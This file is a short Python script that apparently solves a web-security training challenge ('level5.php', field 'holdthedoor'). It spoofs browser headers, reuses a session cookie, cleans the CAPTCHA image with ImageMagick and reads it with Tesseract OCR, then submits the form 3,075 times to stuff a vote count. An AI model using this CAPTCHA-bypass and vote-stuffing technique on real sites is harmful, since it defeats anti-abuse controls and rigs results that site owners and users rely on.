#!/usr/bin/python3
import requests
import pytesseract
import os
from PIL import Image
from lxml.html import fromstring

url = 'http://158.69.76.135/level5.php'
img = 'http://158.69.76.135/tim.php'
myobj = {
    'id': '1',
    'key': None,
    'captcha': None,
    'holdthedoor': 'Submit+Query'
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Origin': 'http://158.69.76.135',
    'Referer': 'http://158.69.76.135/level5.php'
}

for i in range(3075):
    session = requests.Session()
    session.trust_env = False
    r = session.get(url)
    myobj['key'] = r.cookies['HoldTheDoor']
    pic =  session.get(img)
    with open("captcha.png", 'wb') as f:
        f.write(pic.content)
    os.system("convert captcha.png -fill white -opaque fractal nice.tif")
    os.system("convert nice.tif -fill white -opaque black nice.tif")
    os.system("convert nice.tif -threshold 80% nice.tif")
    #os.system('convert captcha.png -threshold 50% -morphology close:2 "1x4: 0,1,1,0" -normalize nice.tif')
    myobj['captcha'] = pytesseract.image_to_string(Image.open('nice.tif'), config="-c tessedit_char_whitelist=0123456789abcdef")
    x = session.post(url, data = myobj, headers=headers, timeout=2)
    print(x.text, i)
